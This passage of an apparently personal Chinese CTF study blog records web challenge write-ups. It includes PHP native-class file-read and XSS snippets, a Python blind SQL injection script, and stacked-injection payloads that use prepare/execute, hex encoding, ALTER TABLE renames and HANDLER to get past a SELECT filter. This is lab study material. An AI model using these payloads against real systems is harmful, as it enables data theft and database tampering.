class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>试了一下上次的file_get_contents，不行，试想了下，直接拼进去会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file_get_contents&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//而上次的是</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个这个new可能要意味着是类(class)的表达；<br>看wp<br>要用hp的内置类SplFileObject来读取文件内容;  </p><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类  "></a>原生类  </h2><p>php原生类，应该指的是php内置有，不用定义的类  </p><p>Error&#x2F;Exception XSS</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>SplFileObject 读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>DirectoryIterator 遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>FilesystemIterator 遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="title-note-19-盲注脚本编写date-2025-03-27-21-30-53tags-notice"><a href="#title-note-19-盲注脚本编写date-2025-03-27-21-30-53tags-notice" class="headerlink" title="title: note-19-盲注脚本编写date: 2025-03-27 21:30:53tags: notice"></a>title: note-19-盲注脚本编写<br>date: 2025-03-27 21:30:53<br>tags: notice</h2><h1 id="盲注脚本编写"><a href="#盲注脚本编写" class="headerlink" title="盲注脚本编写"></a>盲注脚本编写</h1><p>虽然以前做过一些盲注的题，也能根据需要改一下脚本，但是基本都是用网上wp或ai写的脚本，还没有自己写过脚本  </p><h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>先是一个输入框，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">All</span> You Want <span class="hljs-keyword">Is</span> <span class="hljs-keyword">In</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> the <span class="hljs-keyword">column</span> <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;flag&#x27;</span><br>Now, just give the id <span class="hljs-keyword">of</span> passage<br></code></pre></td></tr></table></figure><p>抓包就是post一个id参数，根据数字来显示不同内容<br>用bp fuzz了一下，没fuzz明白，<br>手动fuzz，搞得不明白的<br>最后还是看了别人的wp<br>然后尝试自己写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import requests</span><br><span class="hljs-comment"># str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># #if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br><span class="hljs-comment"># flag=&quot;&quot;</span><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     url=&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br><span class="hljs-comment">#     for st in str:</span><br><span class="hljs-comment">#         sql=&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;)),1,2)&quot;.format(i,st)</span><br><span class="hljs-comment">#         data=&#123;&quot;id&quot;:sql&#125;</span><br><span class="hljs-comment">#         re=requests.post(url,data=data,)</span><br><span class="hljs-comment">#         if &quot;Hello&quot; in re.text:</span><br><span class="hljs-comment">#             flag=flag+st</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#     print(flag)</span><br><br><span class="hljs-comment">#(0,128)二分法：</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment">#if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    url=<span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br>    sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&lt;64),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>    re=requests.post(url,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>,<span class="hljs-number">128</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span> <br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="在写的时候遇到的问题"><a href="#在写的时候遇到的问题" class="headerlink" title="在写的时候遇到的问题:"></a>在写的时候遇到的问题:</h2><p>requests语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.(请求方式，get或post)<br><br>re=requests.post(url,data,可选其它功能（如timeout=$）)<br><br><span class="hljs-comment">#re.text 就等于服务器返回内容中的字符内容</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><br>还有data内容的表示<br>data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br></code></pre></td></tr></table></figure><blockquote><p>for st in (1,128):<br>当时只猜测了flag的前两个字符，问了kimi，说我这个(1,128)的意思是数组，只会进行两次循环😅<br>正确语句<br>for st in range(64,128):</p></blockquote><p>第一次脚本跑的很慢，而且很容易与服务器断连，看别人wp有用二分法的，自己整了个二分法的版本出来  </p><p>这时又遇到了另一个问题<br>当初用requests时学别人wp加上了timeout&#x3D;10，动不动就超时</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">re</span>=requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>.timeout=10)</span><br></code></pre></td></tr></table></figure><p>然后就去掉了timeout，但还是很容易断连<br>于是又有了</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span><span class="hljs-literal">%i</span>)<br>得到：<br><br>第<span class="hljs-number">32</span>个字符<br>NSSCTF&#123;479a596c-<span class="hljs-number">2b47</span>-41ae-b4dc-<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>要是断连的话直接改一下这个起始字符就能继续爆了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>fuzz不会，没有清晰的思路的话真的很费劲，要多学学fuzz思路</p><hr><h2 id="title-note-20date-2025-03-28-15-12-28tags-sql"><a href="#title-note-20date-2025-03-28-15-12-28tags-sql" class="headerlink" title="title: note-20date: 2025-03-28 15:12:28tags: sql"></a>title: note-20<br>date: 2025-03-28 15:12:28<br>tags: sql</h2><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="强网杯 2019 随便注"></a>强网杯 2019 随便注</h1><p>上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp<br>但以前是wp都看不明白<br>先是数字传参，<br>注入点</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">inject</span>=1&#x27;#<br></code></pre></td></tr></table></figure><p>尝试</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>回显  </p><p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p><p>尝试</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,database()))  # <br></code></pre></td></tr></table></figure><p>成功回显<br>error 1105 : XPATH syntax error: ‘!supersqli’</p><p>好像能用报错，但是select被过滤了呀🤡</p><p>尝试了<br>双写绕过<br>使用URL编码<br>&lt;&gt;绕过<br>无果  </p><p>只能看wp了吗<br><a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a><br>原wp写的是真的好，详细透彻</p><p>使用堆叠注入，查看数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>然后是查看表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables from supersqli;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>查看字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show colums from &quot;1919810931114514&quot;;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">没法回显</span><br><span class="hljs-string"></span><br><span class="hljs-string">改为</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;1919810931114514&#x27;</span>;#<br><br>不行<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">成功回显:</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;flag&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">  [2]=&gt;</span><br><span class="hljs-string">  string(2) &quot;NO&quot;</span><br><span class="hljs-string">  [3]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">  [4]=&gt;</span><br><span class="hljs-string">  NULL</span><br><span class="hljs-string">  [5]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><blockquote><p>注意，如果tableName是纯数字，需要用<code>包裹，比如1&#39;;desc </code>1919810931114514&#96;;#</p></blockquote><p>原来是 &#96; 而不是 ‘ 🤡</p><p>到这步骤就有多种方法解题了  </p><h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>通过预编译的方式拼接select 关键字：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;prepare hack from concat(&#x27;</span>sele<span class="hljs-string">&#x27;,&#x27;</span>ct<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`<span class="hljs-string">&#x27;);execute hack;#</span><br></code></pre></td></tr></table></figure><p>得flag{f2078443-bdad-4914-b367-e6691fd333c5}</p><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><blockquote><p>将select * from <code>1919810931114514</code>语句进行16进制编码<br>73656c656374202a2066726f6d20603139313938313039333131313435313460</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="hljs-string">或者定义一个变量名</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">Set</span> <span class="hljs-variable">@jia</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">PREPARE</span> hacker <span class="hljs-keyword">from</span> <span class="hljs-variable">@jia</span>;<span class="hljs-keyword">EXECUTE</span> hacker;#<br></code></pre></td></tr></table></figure><p>看情况用把，我觉得能用预编译的话，那很多都能解决了</p><h2 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h2><blockquote><p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# </span><br><span class="hljs-string">然后直接</span><br><span class="hljs-string">1&#x27;</span>; <span class="hljs-keyword">or</span> ture<br>查看所有字段拿到flag<br></code></pre></td></tr></table></figure><p>666，改不了查询语句就改表名，思路太开阔了，</p><p>这里要注意:<br>我在自己尝试的时候没有将换表名和改字段的操作一条语句完成，我是先改的words to words1，导致了源码sql查询语句的查words出错，后面将flag表改成words的操作无法传入，一切后续操作失效，这时sql语句查询的words，但是现在已经没有words这个表了，原sql语句就用不了了，永远报错，应该是相当于这个靶机废了；</p><h2 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h2><blockquote><p>此题还可以通过handle直接出答案：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure><h1 id="notice-2"><a href="#notice-2" class="headerlink" title="notice"></a>notice</h1><hr><h2 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h2 id="0x02-预编译"><a href="#0x02-预编译" class="headerlink" title="0x02 预编译"></a>0x02 预编译</h2><blockquote><p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,  </p></blockquote><p>我理解是先写好sql语句命令，然后执行，类似编程语言里的定义函数或类？<br>预编译命令用法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure><h2 id="0x03-更改表名"><a href="#0x03-更改表名" class="headerlink" title="0x03 更改表名"></a>0x03 更改表名</h2><p>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</p><h2 id="0x04-handle"><a href="#0x04-handle" class="headerlink" title="0x04 handle"></a>0x04 handle</h2><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 